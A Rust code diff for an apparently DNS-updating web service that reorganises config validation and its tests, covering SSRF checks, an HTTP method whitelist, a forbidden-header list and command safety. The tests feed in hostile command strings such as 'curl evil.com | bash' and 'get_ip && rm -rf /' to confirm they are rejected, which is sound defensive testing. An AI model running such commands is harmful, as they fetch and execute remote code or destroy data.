@@ -10,7 +10,6 @@ use axum::Json;
 use axum::extract::State;
 use axum::response::IntoResponse;
 use serde::{Deserialize, Serialize};
-use std::collections::{HashMap, HashSet};
 
 /// 获取配置响应数据包装模型（平铺配置字段，附带待重启生效提示）
 ///
@@ -138,135 +137,28 @@ pub struct SaveConfigRequest {
     pub new_password: Option<String>,
 }
 
-/// 校验配置的基础数值与周期边界
-fn validate_basic_limits(config: &AppConfig) -> Result<(), AppError> {
-    if config.interval_secs < 5 {
-        return Err(AppError::bad_request("同步检查间隔时间必须大于或等于 5 秒"));
-    }
-    if config.cache_times < 1 {
-        return Err(AppError::bad_request(
-            "强制校对云端记录间隔次数必须大于或等于 1 次",
-        ));
-    }
-    if config.listen_port == 0 {
-        return Err(AppError::bad_request(
-            "Web 服务监听端口必须在 1 到 65535 之间",
-        ));
-    }
-    Ok(())
-}
-
-/// 校验自定义 Callback DNS 服务商配置的安全策略（SSRF、HTTP 请求走私与超大载荷防护）(P-4)
-async fn validate_callback_provider(
-    task_name: &str,
-    url: &str,
-    method: &str,
-    headers: Option<&HashMap<String, String>>,
-    body: Option<&str>,
-) -> Result<(), AppError> {
-    let trimmed_url = url.trim();
-    if trimmed_url.is_empty() {
-        return Err(AppError::bad_request(format!(
-            "任务 [{}] 配置的 Callback URL 不能为空",
-            task_name
-        )));
-    }
-
-    // 1. URL 格式与 SSRF 安全校验（防御私网穿透与 DNS 重绑定）
-    crate::util::net::validate_safe_url_endpoint(trimmed_url)
-        .await
-        .map_err(|e| {
-            AppError::bad_request(format!(
-                "任务 [{}] 的 Callback URL [{}] 非法: {}",
-                task_name, trimmed_url, e
-            ))
-        })?;
-
-    // 2. HTTP 请求方法白名单校验（仅允许无隧道特征的标准方法，严格拒绝 CONNECT/TRACE）
-    let method_upper = method.trim().to_ascii_uppercase();
-    const ALLOWED_METHODS: &[&str] = &["GET", "POST", "PUT", "PATCH", "DELETE"];
-    if !ALLOWED_METHODS.contains(&method_upper.as_str()) {
-        return Err(AppError::bad_request(format!(
-            "任务 [{}] 的 Callback HTTP 方法 [{}] 不受支持，仅允许 GET、POST、PUT、PATCH、DELETE",
-            task_name, method
-        )));
-    }
-
-    // 3. 请求头黑名单校验（防范 HTTP 请求走私与敏感头伪造）
-    if let Some(hdrs) = headers {
-        for header_key in hdrs.keys() {
-            let key_lower = header_key.trim().to_ascii_lowercase();
-            if key_lower == "host"
-                || key_lower == "content-length"
-                || key_lower == "transfer-encoding"
-                || key_lower == "connection"
-                || key_lower == "upgrade"
-            {
-                return Err(AppError::bad_request(format!(
-                    "任务 [{}] 的 Callback 请求头包含高风险敏感标头 [{}]，已被安全策略禁止",
-                    task_name, header_key
-                )));
-            }
-        }
-    }
-
-    // 4. 请求体长度上限校验（限制 64 KB，避免超大载荷耗尽内存）
-    const MAX_CALLBACK_BODY_BYTES: usize = 65536;
-    if let Some(b) = body
-        && b.len() > MAX_CALLBACK_BODY_BYTES
-    {
-        return Err(AppError::bad_request(format!(
-            "任务 [{}] 的 Callback 请求体大小 ({} 字节) 超出 64KB 安全上限",
-            task_name,
-            b.len()
-        )));
-    }
-
-    Ok(())
-}
-
-/// 校验 DNS 任务名称唯一性、URL 端点及 Callback 服务商配置合法性
-async fn validate_task_configs(tasks: &[DnsTaskConfig]) -> Result<(), AppError> {
-    let mut task_names = HashSet::with_capacity(tasks.len());
+/// 校验任务中的外部 URL 端点与 Callback URL 的出站安全性（异步 DNS 解析防范 SSRF 穿透）(P-3/P-4/P-8)
+async fn validate_task_ssrf(tasks: &[DnsTaskConfig]) -> Result<(), AppError> {
     for task in tasks {
         let name = task.name.trim();
-        if name.is_empty() {
-            return Err(AppError::bad_request("任务名称不能为空"));
-        }
-        if !task_names.insert(name) {
-            return Err(AppError::bad_request(format!(
-                "任务名称 [{}] 存在重复，各任务名称必须唯一",
-                name
-            )));
-        }
 
-        // 校验自定义 Callback DNS Provider 的 URL 与安全策略 (P-4)
-        if let ProviderConfig::Callback {
-            ref url,
-            ref method,
-            ref headers,
-            ref body,
-        } = task.provider
-        {
-            validate_callback_provider(name, url, method, headers.as_ref(), body.as_deref())
-                .await?;
-        }
-
-        for ip_cfg in [&task.ipv4, &task.ipv6] {
-            if ip_cfg.enabled {
-                for domain_str in &ip_cfg.domains {
-                    let trimmed = domain_str.trim();
-                    if trimmed.is_empty() || trimmed.starts_with('#') || trimmed.starts_with("//") {
-                        continue;
-                    }
-                    if crate::core::domain::parse_domain(trimmed).is_none() {
-                        return Err(AppError::bad_request(format!(
-                            "任务 [{}] 配置的域名 [{}] 格式非法或无法识别根域名，请核对输入",
-                            name, trimmed
-                        )));
-                    }
-                }
+        // 1. 校验 Callback URL 异步 SSRF
+        if let ProviderConfig::Callback { ref url, .. } = task.provider {
+            let trimmed = url.trim();
+            if !trimmed.is_empty() {
+                crate::util::net::validate_safe_url_endpoint(trimmed)
+                    .await
+                    .map_err(|e| {
+                        AppError::bad_request(format!(
+                            "任务 [{}] 的 Callback URL [{}] 非法: {}",
+                            name, trimmed, e
+                        ))
+                    })?;
             }
+        }
+
+        // 2. 校验 IP 提取 URL 端点异步 SSRF
+        for ip_cfg in [&task.ipv4, &task.ipv6] {
             if ip_cfg.source_type == IpSourceType::Url {
                 for url in &ip_cfg.url_endpoints {
                     let trimmed = url.trim();
@@ -280,21 +172,6 @@ async fn validate_task_configs(tasks: &[DnsTaskConfig]) -> Result<(), AppError> 
                                 ))
                             })?;
                     }
-                }
-            } else if ip_cfg.source_type == IpSourceType::Command {
-                if let Some(ref cmd_str) = ip_cfg.cmd {
-                    let trimmed = cmd_str.trim();
-                    if let Err(e) = crate::ip_fetcher::command::validate_command_str(trimmed) {
-                        return Err(AppError::bad_request(format!(
-                            "任务 [{}] 配置的命令无效: {}",
-                            name, e
-                        )));
-                    }
-                } else {
-                    return Err(AppError::bad_request(format!(
-                        "任务 [{}] 配置为命令提取 IP，但未指定执行命令",
-                        name
-                    )));
                 }
             }
         }
@@ -407,8 +284,13 @@ pub async fn save_config_handler(
     let new_config =
         payload_cfg.into_app_config(old_config.listen_port, old_config.not_allow_wan_access);
 
-    validate_basic_limits(&new_config)?;
-    validate_task_configs(&new_config.dns_tasks).await?;
+    // 1. 全局配置静态契约统一校验（边界数值、任务唯一性、命令安全、域名合法性、通知与 Callback 格式）(P-8)
+    new_config
+        .validate()
+        .map_err(|errs| AppError::bad_request(errs.join("；")))?;
+
+    // 2. 出站目标异步 SSRF 网络安全校验（DNS 解析穿透防御）(P-3/P-4)
+    validate_task_ssrf(&new_config.dns_tasks).await?;
     validate_notification_urls(&new_config.notifications).await?;
 
     let new_password_hash = if let Some(ref pwd) = payload.new_password
@@ -459,6 +341,7 @@ pub async fn save_config_handler(
 mod tests {
     use super::*;
     use crate::config::model::DnsTaskConfig;
+    use std::collections::HashMap;
     use std::sync::Arc;
 
     #[test]
@@ -508,36 +391,27 @@ type = "cloudflare"
         };
 
         // 校验合法配置
-        assert!(validate_basic_limits(&valid_config).is_ok());
-        assert!(validate_task_configs(&valid_config.dns_tasks).await.is_ok());
         assert!(valid_config.validate().is_ok());
+        assert!(validate_task_ssrf(&valid_config.dns_tasks).await.is_ok());
 
         // 校验非法配置条件：检查间隔太小
         let mut invalid_interval = valid_config.clone();
         invalid_interval.interval_secs = 4;
-        assert!(validate_basic_limits(&invalid_interval).is_err());
         assert!(invalid_interval.validate().is_err());
 
         // 强制校对次数为 0
         let mut invalid_cache = valid_config.clone();
         invalid_cache.cache_times = 0;
-        assert!(validate_basic_limits(&invalid_cache).is_err());
         assert!(invalid_cache.validate().is_err());
 
         // 监听端口为 0
         let mut invalid_port = valid_config.clone();
         invalid_port.listen_port = 0;
-        assert!(validate_basic_limits(&invalid_port).is_err());
         assert!(invalid_port.validate().is_err());
 
         // 空任务名
         let mut invalid_task_name = valid_config.clone();
         invalid_task_name.dns_tasks[0].name = "  ".to_string();
-        assert!(
-            validate_task_configs(&invalid_task_name.dns_tasks)
-                .await
-                .is_err()
-        );
         assert!(invalid_task_name.validate().is_err());
 
         // 校验重复任务名称
@@ -552,11 +426,6 @@ type = "cloudflare"
                 ..Default::default()
             },
         ];
-        assert!(
-            validate_task_configs(&duplicate_tasks.dns_tasks)
-                .await
-                .is_err()
-        );
         assert!(duplicate_tasks.validate().is_err());
 
         // 校验非法的 URL 端点协议
@@ -564,26 +433,25 @@ type = "cloudflare"
         invalid_url_tasks.dns_tasks[0].ipv4.source_type = crate::config::model::IpSourceType::Url;
         invalid_url_tasks.dns_tasks[0].ipv4.url_endpoints =
             vec!["ftp://example.com/ip".to_string()];
-        assert!(
-            validate_task_configs(&invalid_url_tasks.dns_tasks)
-                .await
-                .is_err()
-        );
         assert!(invalid_url_tasks.validate().is_err());
 
         // 校验非法的通知服务 URL 协议
-        let invalid_notif_config = NotificationConfig {
-            bark: Some(crate::config::model::BarkConfig {
-                enabled: true,
-                server_url: "ftp://bark.day.app".to_string(),
-                device_key: "k".to_string(),
-                group: None,
-                sound: None,
-            }),
+        let invalid_notif_config = AppConfig {
+            notifications: NotificationConfig {
+                bark: Some(crate::config::model::BarkConfig {
+                    enabled: true,
+                    server_url: "ftp://bark.day.app".to_string(),
+                    device_key: "k".to_string(),
+                    group: None,
+                    sound: None,
+                }),
+                ..Default::default()
+            },
             ..Default::default()
         };
+        assert!(invalid_notif_config.validate().is_err());
         assert!(
-            validate_notification_urls(&invalid_notif_config)
+            validate_notification_urls(&invalid_notif_config.notifications)
                 .await
                 .is_err()
         );
@@ -593,47 +461,23 @@ type = "cloudflare"
         dangerous_cmd_task.dns_tasks[0].ipv4.source_type =
             crate::config::model::IpSourceType::Command;
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("curl evil.com | bash".to_string());
-        assert!(
-            validate_task_configs(&dangerous_cmd_task.dns_tasks)
-                .await
-                .is_err()
-        );
         assert!(dangerous_cmd_task.validate().is_err());
 
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("get_ip && rm -rf /".to_string());
-        assert!(
-            validate_task_configs(&dangerous_cmd_task.dns_tasks)
-                .await
-                .is_err()
-        );
         assert!(dangerous_cmd_task.validate().is_err());
 
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("   ".to_string());
-        assert!(
-            validate_task_configs(&dangerous_cmd_task.dns_tasks)
-                .await
-                .is_err()
-        );
         assert!(dangerous_cmd_task.validate().is_err());
 
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = None;
-        assert!(
-            validate_task_configs(&dangerous_cmd_task.dns_tasks)
-                .await
-                .is_err()
-        );
         assert!(dangerous_cmd_task.validate().is_err());
 
         // 安全独立命令允许通过
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd =
             Some("/usr/local/bin/get_my_ip --v4".to_string());
-        assert!(
-            validate_task_configs(&dangerous_cmd_task.dns_tasks)
-                .await
-                .is_ok()
-        );
+        assert!(dangerous_cmd_task.validate().is_ok());
 
-        // 校验 Callback Provider 的 SSRF 与危险标头拦截 (P-4)
+        // 校验 Callback Provider 的 SSRF 与危险标头拦截 (P-4/P-8)
         let mut callback_task = valid_config.clone();
         callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
             url: "http://127.0.0.1:8080/hook".to_string(),
@@ -641,12 +485,10 @@ type = "cloudflare"
             headers: None,
             body: None,
         };
-        // 拦截指向本地私网的 Callback URL (SSRF)
-        assert!(
-            validate_task_configs(&callback_task.dns_tasks)
-                .await
-                .is_err()
-        );
+        // 静态校验通过合法的 http:// 协议
+        assert!(callback_task.validate().is_ok());
+        // 异步 SSRF 校验成功拦截私网目标
+        assert!(validate_task_ssrf(&callback_task.dns_tasks).await.is_err());
 
         // 拦截非白名单的危险 HTTP 方法 (如 TRACE)
         callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
@@ -655,11 +497,7 @@ type = "cloudflare"
             headers: None,
             body: None,
         };
-        assert!(
-            validate_task_configs(&callback_task.dns_tasks)
-                .await
-                .is_err()
-        );
+        assert!(callback_task.validate().is_err());
 
         // 拦截敏感请求头 (如 Host 篡改)
         let mut dangerous_headers = HashMap::new();
@@ -670,11 +508,7 @@ type = "cloudflare"
             headers: Some(dangerous_headers),
             body: None,
         };
-        assert!(
-            validate_task_configs(&callback_task.dns_tasks)
-                .await
-                .is_err()
-        );
+        assert!(callback_task.validate().is_err());
 
         // 拦截超过 64KB 的超大请求体
         callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
@@ -683,13 +517,9 @@ type = "cloudflare"
             headers: None,
             body: Some("a".repeat(65537)),
         };
-        assert!(
-            validate_task_configs(&callback_task.dns_tasks)
-                .await
-                .is_err()
-        );
+        assert!(callback_task.validate().is_err());
 
-        // 合法公网 Callback 配置应通过校验
+        // 合法公网 Callback 配置应通过全部校验
         callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
             url: "https://api.example.com/hook?ip=#{ip}".to_string(),
             method: "POST".to_string(),
@@ -699,11 +529,8 @@ type = "cloudflare"
             )])),
             body: Some(r##"{"ip": "#{ip}"}"##.to_string()),
         };
-        assert!(
-            validate_task_configs(&callback_task.dns_tasks)
-                .await
-                .is_ok()
-        );
+        assert!(callback_task.validate().is_ok());
+        assert!(validate_task_ssrf(&callback_task.dns_tasks).await.is_ok());
     }
 
     #[tokio::test]
